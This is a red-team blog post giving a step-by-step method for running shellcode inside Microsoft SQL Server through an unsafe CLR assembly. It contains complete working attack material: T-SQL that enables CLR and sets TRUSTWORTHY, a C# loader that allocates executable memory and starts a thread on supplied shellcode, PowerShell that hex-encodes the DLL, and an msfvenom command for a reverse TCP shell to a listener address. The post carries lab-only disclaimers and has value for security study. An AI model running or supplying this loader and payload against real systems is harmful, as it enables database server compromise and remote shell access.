---
layout: post
title: "Using MSSQL CLR Assembly for Code Execution"
subtitle: "Shellcode execution from inside SQL Server via unsafe CLR"
date: 2025-01-13
categories: [security-research, red-teaming]
tags: [MSSQL, CLR, shellcode, Windows]
thumbnail-img: https://img001.prntscr.com/file/img001/iS6J0AZHRrioiL1LURYKDw.png
share-img: https://img001.prntscr.com/file/img001/iS6J0AZHRrioiL1LURYKDw.png
author: Ben Tamam
comments: false
readtime: true
share-title: "MSSQL CLR for Code Execution - Ben Tamam"
share-description: "Abusing unsafe CLR assemblies in SQL Server to load and run shellcode from the database process."
---

## Introduction

This article walks you through how to achieve arbitrary code execution in Microsoft SQL Server (MSSQL) by leveraging custom CLR assemblies. The technique involves compiling a .NET assembly that can inject and execute shellcode directly from the SQL Server process.

This is a simplified version of a technique originally learned during the [PEN-300 OSEP](https://www.offsec.com/courses/pen-300/) course. Great credit goes to Offensive Security for their outstanding explanation of this method. The post is intended to make the process clearer and easier to follow for Red Team practitioners.

<!--more-->

---

## Environment Details

For this walkthrough, the following setup was used:

- **SQL Server Version**: SQL Server 2022 Developer Edition  
- **SQL Server Management Studio (SSMS)**: Latest version  
- **Operating System**: Windows 10 Pro (64-bit)

Here’s a quick look at my **SQL Server setup** after installation:

~~~sql
SQL Server Management Studio                                   20.2.30.0
SQL Server Management Objects (SMO)                             17.100.40.0+f57178c95d4376485d3f597f2b829bbd6f80fd6f
Microsoft T-SQL Parser                                          17.2.3.1+46115224c373754fdd41516eaae1386cabc4819e.46115224c373754fdd41516eaae1386cabc4819e
Microsoft Analysis Services Client Tools                         20.0.3.0
Microsoft Data SqlClient (MDS)                                   5.1.5
Microsoft SQL Server Data-Tier Application Framework (DacFX)    162.3.566.1+89d89fe935702c8836ebaf6a03cf61b85118f847.89d89fe935702c8836ebaf6a03cf61b85118f847
Microsoft .NET Framework                                         4.0.30319.42000
Operating System                                                 10.0.19045
~~~

---

## Why Use CLR Assemblies?

**Common Language Runtime (CLR)** in MSSQL allows you to run **custom .NET code directly inside the SQL Server process**.  
This provides a powerful method for **injecting shellcode** or executing **arbitrary payloads** in-memory, making it harder for traditional defenses to detect.

---

## Step 1: Enabling CLR Integration in MSSQL

Run the following in **SSMS** to enable CLR and relax trust (lab/demo only):

~~~sql
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
GO
ALTER DATABASE master SET TRUSTWORTHY ON;
GO
~~~

---

## Step 2: Creating the CLR Assembly

We’ll create a **.NET assembly** that allocates memory, copies shellcode, and executes it via **Win32 APIs**.

### Open Visual Studio

- Create **SQL Server Database Project**.
- Enable *Generate Script (.sql)* to auto-create a deploy script.  
  ![VS](https://img001.prntscr.com/file/img001/iS6J0AZHRrioiL1LURYKDw.png){: width="900" }
  ![Prop](https://img001.prntscr.com/file/img001/1mYYmsoPQla8uxbbN1gGlg.png){: width="900" }
- Set **SQLCLR** property to **Unsafe**.  
  ![SQLCLR Unsafe](https://img001.prntscr.com/file/img001/TOm9O0MRT9yPzCB8wOzQyA.png){: width="900" }

### Add a New SQL CLR Stored Procedure

- Solution Explorer → **Add → New Item**
- **SQL CLR C# Stored Procedure** (e.g., `SqlStoredProcedure1.cs`)

### Shellcode Loader in C#

> Demo loader for educational/lab use only.

~~~csharp
using System;
using Microsoft.SqlServer.Server;
using System.Runtime.InteropServices;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void ShellcodeLoader(string sc)
    {
        SqlContext.Pipe.Send(ShellcodeExec(sc));
    }

    public static string ShellcodeExec(string sc)
    {
        byte[] shellcode = ConvertHexToByteArray(sc);
        UInt64 addr = VirtualAlloc(0, (UInt64)shellcode.Length, 0x1000, 0x40);
        Marshal.Copy(shellcode, 0, (IntPtr)addr, shellcode.Length);
        CreateThread(0, 0, addr, 0, 0, 0);
        return "";
    }

    private static byte[] ConvertHexToByteArray(string hex)
    {
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        return bytes;
    }

    [DllImport("kernel32")]
    private static extern UInt64 VirtualAlloc(UInt64 lpAddress, UInt64 dwSize,
        UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32")]
    private static extern UInt32 CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize,
        UInt64 lpStartAddress, UInt32 lpParameter, UInt32 dwCreationFlags, UInt32 lpThreadId);
}
~~~

---

## Step 3: Compiling the Assembly

![Build](https://img001.prntscr.com/file/img001/yLx3BQHsQ3iKcYpAyfwBOA.png){: width="900" }

### Converting DLL to Hex

~~~powershell
# Path to your DLL file
$assemblyFile = "C:\Users\DevHost\source\repos\SQLSampleSC\SQLSampleSC\bin\Release\SQLSampleSC.dll"

# StringBuilder for efficient hex concat
$stringBuilder = New-Object System.Text.StringBuilder
$fileStream = [IO.File]::OpenRead($assemblyFile)

# Convert each byte to two-character hex
while (($b = $fileStream.ReadByte()) -gt -1) {
  $null = $stringBuilder.Append($b.ToString("X2"))
}

# Save one-line hex with 0x prefix
("0x{0}" -f $stringBuilder.ToString()) |
  Out-File -FilePath "C:\Users\DevHost\Desktop\sql.txt"

# Preview
type C:\Users\DevHost\Desktop\sql.txt
# 4D5A90000300000004000000FFFF0000B8000000000...
~~~

### Generating Shellcode

~~~bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.69 LPORT=443 -f hex
# Payload size: 460 bytes
# Final size of hex file: 920 bytes
# fc4883e4f0e8c0000000415141...
~~~

### Executing the Shellcode via SQL

~~~sql
CREATE ASSEMBLY MSSQL_ShellCodeLoader
FROM 0x...<HEX format of DLL>
WITH PERMISSION_SET = UNSAFE;
GO

CREATE PROCEDURE shellcode_loader
  @sc NVARCHAR(MAX)
AS EXTERNAL NAME MSSQL_ShellCodeLoader.StoredProcedures.ShellcodeLoader;
GO

DECLARE @shellcode NVARCHAR(MAX) = '<HEX format of Shellcode>';
EXEC shellcode_loader @shellcode;
~~~

Once executed, you should see your shellcode run successfully.

![SCEXEC](https://img001.prntscr.com/file/img001/3CkFJIEuQDiZcp4Bv3VMnA.png){: width="900" }
